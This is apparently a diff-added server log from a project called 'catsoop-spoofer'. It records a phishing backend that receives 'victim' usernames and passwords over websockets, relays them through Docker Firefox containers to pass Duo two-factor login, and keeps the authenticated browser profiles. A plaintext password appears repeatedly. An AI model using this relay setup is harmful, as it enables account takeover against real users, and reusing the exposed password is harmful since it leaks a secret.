+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10870 10870 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10870
+starting docker process at: 1589863092959
+Archive:  /tmp/duo10864.zip
+  inflating: /tmp/duo10864/background.js  
+  inflating: /tmp/duo10864/duo-login.js  
+  inflating: /tmp/duo10864/manifest.json  
+  inflating: /tmp/duo10864/popup.html  
+ extracting: /tmp/duo10864/icon32.png  
+  inflating: /tmp/duo10864/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10870.zip
+  inflating: /tmp/duo10870/background.js  
+  inflating: /tmp/duo10870/duo-login.js  
+  inflating: /tmp/duo10870/manifest.json  
+  inflating: /tmp/duo10870/popup.html  
+ extracting: /tmp/duo10870/icon32.png  
+  inflating: /tmp/duo10870/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589863092990
+SOCKET_SERVER:victim 1589863091453 closing...
+DOCKER_MANAGER:released from SID backend: 10864
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 812, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 4003 (private use), no reason
+f96fbc190f3cd902679df776bd1b124902aa1aaea37a8e3ca43eb2778f3a7b58
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589863091453', 'id': 'backend', 'bid': '10864'}
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a0bf7b8> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1abcf8> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a0bf240> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1dd5c0> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589863112872', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589863112872 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 291.5929186344147 with bid:  10864
+DOCKER_MANAGER:available backends:  6  or  6 out of 7
+DOCKER_MANAGER:backend [bid= 10864 ;sid= 1589863112872 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10864 1589863112872 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10864', '1589863112872', 'tjz', 'babygirl@physx3894']
+Archive:  /tmp/duo10864.zip
+  inflating: /tmp/duo10864/background.js  
+  inflating: /tmp/duo10864/duo-login.js  
+  inflating: /tmp/duo10864/manifest.json  
+  inflating: /tmp/duo10864/popup.html  
+ extracting: /tmp/duo10864/icon32.png  
+  inflating: /tmp/duo10864/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1dd710> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589863112603', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589863112603 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 292.32322907447815 with bid:  10865
+DOCKER_MANAGER:available backends:  5  or  5 out of 7
+DOCKER_MANAGER:backend [bid= 10865 ;sid= 1589863112603 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10865 1589863112603 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10865', '1589863112603', 'tjz', 'babygirl@physx3894']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10871 10871 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10871
+starting docker process at: 1589863114017
+Archive:  /tmp/duo10865.zip
+  inflating: /tmp/duo10865/background.js  
+  inflating: /tmp/duo10865/duo-login.js  
+  inflating: /tmp/duo10865/manifest.json  
+  inflating: /tmp/duo10865/popup.html  
+ extracting: /tmp/duo10865/icon32.png  
+  inflating: /tmp/duo10865/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10871.zip
+  inflating: /tmp/duo10871/background.js  
+  inflating: /tmp/duo10871/duo-login.js  
+  inflating: /tmp/duo10871/manifest.json  
+  inflating: /tmp/duo10871/popup.html  
+ extracting: /tmp/duo10871/icon32.png  
+  inflating: /tmp/duo10871/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589863114051
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589863112872', 'id': 'backend', 'bid': '10864'}
+715b878cf651e3989b6c33dd6927346223bc435e990a8a8098af9b4ad5beeaec
+SOCKET_SERVER:received:  {'status': 'validCreds', 'sid': '1589863112872', 'id': 'backend', 'bid': '10864'}
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589863112603', 'id': 'backend', 'bid': '10865'}
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'sid': '1589863112872', 'id': 'backend', 'bid': '10864'}
+SOCKET_SERVER:Setting authready to true for 1589863112872 . Authm is:  None
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'number': 'XXX-XXX-8756', 'sid': '1589863112872', 'id': 'backend', 'bid': '10864'}
+SOCKET_SERVER:Setting authready to true for 1589863112872 . Authm is:  None
+SOCKET_SERVER:received:  {'status': 'validCreds', 'sid': '1589863112603', 'id': 'backend', 'bid': '10865'}
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'sid': '1589863112603', 'id': 'backend', 'bid': '10865'}
+SOCKET_SERVER:Setting authready to true for 1589863112603 . Authm is:  None
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'number': 'XXX-XXX-8756', 'sid': '1589863112603', 'id': 'backend', 'bid': '10865'}
+SOCKET_SERVER:Setting authready to true for 1589863112603 . Authm is:  None
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589863112872'}
+SOCKET_SERVER:backend is ready, so sending auth method
+SOCKET_SERVER:received:  {'status': 'authing...', 'sid': '1589863112872', 'id': 'backend', 'bid': '10864'}
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589863112603'}
+SOCKET_SERVER:backend is ready, so sending auth method
+SOCKET_SERVER:received:  {'status': 'authing...', 'sid': '1589863112603', 'id': 'backend', 'bid': '10865'}
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a262c88> ; /
+SOCKET_SERVER:received:  {'status': 'loggedIn', 'sid': '1589863112603', 'user': 'tjz', 'pass': 'babygirl@physx3894', 'id': 'backend', 'bid': '10865'}
+SOCKET_SERVER:Session SID<->BID<->USR : 1589863112603<->10865tjz successful.
+SOCKET_SERVER:Appending profile tjz with path /docker/appdata/firefoxSID10865/profile to /home/tjz/.mozilla/firefox/profiles.ini
+DOCKER_MANAGER:Executing: docker stop firefoxSID10865
+DOCKER_MANAGER:Saved successful container: 10865 : tjz
+DOCKER_MANAGER:KEY exists: 10864
+DOCKER_MANAGER:KEY exists: 10865
+DOCKER_MANAGER:KEY exists: 10866
+DOCKER_MANAGER:KEY exists: 10867
+DOCKER_MANAGER:KEY exists: 10868
+DOCKER_MANAGER:KEY exists: 10869
+DOCKER_MANAGER:KEY exists: 10870
+DOCKER_MANAGER:KEY exists: 10871
+SOCKET_SERVER:victim 1589863112603 closing...
+SOCKET_SERVER:this victim was succesful. Not releasing backend.
+SOCKET_SERVER:received:  {'status': 'loggedIn', 'sid': '1589863112872', 'user': 'tjz', 'pass': 'babygirl@physx3894', 'id': 'backend', 'bid': '10864'}
+SOCKET_SERVER:Session SID<->BID<->USR : 1589863112872<->10864tjz successful.
+SOCKET_SERVER:Appending profile tjz with path /docker/appdata/firefoxSID10864/profile to /home/tjz/.mozilla/firefox/profiles.ini
+DOCKER_MANAGER:Executing: docker stop firefoxSID10864
+DOCKER_MANAGER:Saved successful container: 10864 : tjz
+DOCKER_MANAGER:KEY exists: 10864
+DOCKER_MANAGER:KEY exists: 10866
+DOCKER_MANAGER:KEY exists: 10867
+DOCKER_MANAGER:KEY exists: 10868
+DOCKER_MANAGER:KEY exists: 10869
+DOCKER_MANAGER:KEY exists: 10870
+DOCKER_MANAGER:KEY exists: 10871
+SOCKET_SERVER:victim 1589863112872 closing...
+SOCKET_SERVER:this victim was succesful. Not releasing backend.
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
+    message = await self.read_message()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 895, in read_message
+    frame = await self.read_data_frame(max_size=self.max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 971, in read_data_frame
+    frame = await self.read_frame(max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 1051, in read_frame
+    extensions=self.extensions,
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/framing.py", line 105, in read
+    data = await reader(2)
+  File "/usr/lib/python3.6/asyncio/streams.py", line 672, in readexactly
+    raise IncompleteReadError(incomplete, n)
+asyncio.streams.IncompleteReadError: 0 bytes read on a total of 2 expected bytes
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 803, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
+    message = await self.read_message()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 895, in read_message
+    frame = await self.read_data_frame(max_size=self.max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 971, in read_data_frame
+    frame = await self.read_frame(max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 1051, in read_frame
+    extensions=self.extensions,
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/framing.py", line 105, in read
+    data = await reader(2)
+  File "/usr/lib/python3.6/asyncio/streams.py", line 672, in readexactly
+    raise IncompleteReadError(incomplete, n)
+asyncio.streams.IncompleteReadError: 0 bytes read on a total of 2 expected bytes
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 803, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
+    message = await self.read_message()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 895, in read_message
+    frame = await self.read_data_frame(max_size=self.max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 971, in read_data_frame
+    frame = await self.read_frame(max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 1051, in read_frame
+    extensions=self.extensions,
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/framing.py", line 105, in read
+    data = await reader(2)
+  File "/usr/lib/python3.6/asyncio/streams.py", line 672, in readexactly
+    raise IncompleteReadError(incomplete, n)
+asyncio.streams.IncompleteReadError: 0 bytes read on a total of 2 expected bytes
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 803, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
+firefoxSID10865
+firefoxSID10864
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
